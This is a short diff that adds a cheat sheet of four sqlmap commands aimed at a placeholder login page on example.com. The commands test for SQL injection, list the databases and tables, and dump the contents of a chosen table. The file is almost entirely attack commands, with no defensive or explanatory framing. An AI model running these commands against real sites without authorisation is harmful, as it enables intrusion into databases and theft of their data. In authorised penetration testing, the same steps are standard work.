@@ -1,0 +1,11 @@
+# Basic SQL injection test
+sqlmap -u "http://example.com/login.php?username=admin&password=password"
+
+# Enumerate databases
+sqlmap -u "http://example.com/login.php?username=admin&password=password" --dbs
+
+# Enumerate tables from a specific database
+sqlmap -u "http://example.com/login.php?username=admin&password=password" -D database_name --tables
+
+# Dump data from a specific table
+sqlmap -u "http://example.com/login.php?username=admin&password=password" -D database_name -T table_name --dump
